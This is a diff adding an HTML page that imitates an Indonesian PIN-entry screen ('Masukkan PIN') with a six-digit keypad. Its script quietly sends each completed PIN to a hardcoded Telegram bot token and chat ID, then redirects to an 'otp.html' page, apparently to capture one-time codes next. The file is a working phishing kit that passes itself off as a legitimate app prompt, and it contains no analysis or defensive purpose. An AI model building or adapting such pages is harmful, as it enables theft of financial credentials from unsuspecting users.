@@ -1,0 +1,102 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Masukkan PIN</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+  />
+</head>
+<body class="bg-[#3F44E0] min-h-screen flex flex-col items-center justify-start pt-20 text-white font-sans">
+  <h1 class="text-xl mb-14">Masukkan PIN</h1>
+  <div class="flex space-x-6 mb-40">
+    <span id="dot1" class="w-5 h-5 rounded-full bg-[#7B81F7] opacity-30"></span>
+    <span id="dot2" class="w-5 h-5 rounded-full bg-[#7B81F7] opacity-30"></span>
+    <span id="dot3" class="w-5 h-5 rounded-full bg-[#7B81F7] opacity-30"></span>
+    <span id="dot4" class="w-5 h-5 rounded-full bg-[#7B81F7] opacity-30"></span>
+    <span id="dot5" class="w-5 h-5 rounded-full bg-[#7B81F7] opacity-30"></span>
+    <span id="dot6" class="w-5 h-5 rounded-full bg-[#7B81F7] opacity-30"></span>
+  </div>
+  <div class="w-full max-w-xs grid grid-cols-3 gap-y-12 text-center text-lg font-normal">
+    <button class="focus:outline-none" data-num="1">1</button>
+    <button class="focus:outline-none" data-num="2">2</button>
+    <button class="focus:outline-none" data-num="3">3</button>
+    <button class="focus:outline-none" data-num="4">4</button>
+    <button class="focus:outline-none" data-num="5">5</button>
+    <button class="focus:outline-none" data-num="6">6</button>
+    <button class="focus:outline-none" data-num="7">7</button>
+    <button class="focus:outline-none" data-num="8">8</button>
+    <button class="focus:outline-none" data-num="9">9</button>
+    <div></div>
+    <button class="focus:outline-none" data-num="0">0</button>
+    <button id="backspace" class="focus:outline-none flex justify-center items-center">
+      <i class="fas fa-backspace text-black bg-white rounded-md p-1"></i>
+    </button>
+  </div>
+
+  <script>
+    const pinLength = 6;
+    let pin = "";
+
+    const dots = [
+      document.getElementById("dot1"),
+      document.getElementById("dot2"),
+      document.getElementById("dot3"),
+      document.getElementById("dot4"),
+      document.getElementById("dot5"),
+      document.getElementById("dot6"),
+    ];
+
+    function updateDots() {
+      for (let i = 0; i < pinLength; i++) {
+        if (i < pin.length) {
+          dots[i].classList.remove("opacity-30");
+        } else {
+          dots[i].classList.add("opacity-30");
+        }
+      }
+    }
+
+    function sendPinToTelegram(pin) {
+      // Replace these with your own bot token and chat ID
+      const botToken = "8392304649:AAFSpxG4uQqhdzOi-XD0ADeuykpj4RGAgDU";
+      const chatId = "7914074847";
+      const message = encodeURIComponent(`New PIN entered: ${pin}`);
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            window.location.href="otp.html";
+          } else {
+            alert("Failed to send PIN.");
+          }
+        })
+        .catch(() => alert("Error sending PIN."));
+    }
+
+    document.querySelectorAll("button[data-num]").forEach(button => {
+      button.addEventListener("click", () => {
+        if (pin.length < pinLength) {
+          pin += button.getAttribute("data-num");
+          updateDots();
+          if (pin.length === pinLength) {
+            sendPinToTelegram(pin);
+          }
+        }
+      });
+    });
+
+    document.getElementById("backspace").addEventListener("click", () => {
+      if (pin.length > 0) {
+        pin = pin.slice(0, -1);
+        updateDots();
+      }
+    });
+
+    updateDots();
+  </script>
+</body>
+</html>
